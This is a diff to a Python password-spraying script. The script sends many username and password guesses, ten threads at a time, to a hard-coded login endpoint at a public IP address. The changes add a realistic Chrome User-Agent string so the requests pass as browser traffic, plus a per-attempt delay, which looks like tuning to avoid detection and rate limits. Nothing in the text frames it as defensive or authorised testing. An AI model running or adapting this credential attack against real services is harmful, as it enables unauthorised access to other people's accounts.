@@ -1,13 +1,16 @@
 import os
 import requests
 from concurrent.futures import ThreadPoolExecutor
+import time
 
 # Set the correct target URL for the login endpoint on your backend
 url = "http://34.224.51.201:5050/login"
+# url = "https://reqbin.com/api/v1/ip"
 
 # Define headers (optional)
 headers = {
-    'User-Agent': 'Mozilla/5.0',
+    # 'User-Agent': 'Mozilla/5.0',
+    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
     'Content-Type': 'application/json'  # Ensure correct content type
 }
 
@@ -43,12 +46,17 @@ def attempt_login(username, password):
         else:
             print(f"[-] Failed login for {username}:{password} (Status Code: {response.status_code})")
     except Exception as e:
-        print(f"[-] Error occurred for {username}:{password}: {e}")
+        # print(response.status_code)
+        # print(f"[-] Error occurred for {username}:{password}: {e}")
+        print(e)
+    # Retry after sleep
+    time.sleep(1)  # Optional: Add delay before retrying
 
 # Function to perform password spraying
 def password_spray(usernames, passwords):
     # Using ThreadPoolExecutor to manage a pool of threads
     with ThreadPoolExecutor(max_workers=10) as executor:
+    # with ThreadPoolExecutor(max_workers=1) as executor:
         # Iterate through each username and try each password
         for username in usernames:
             for password in passwords:
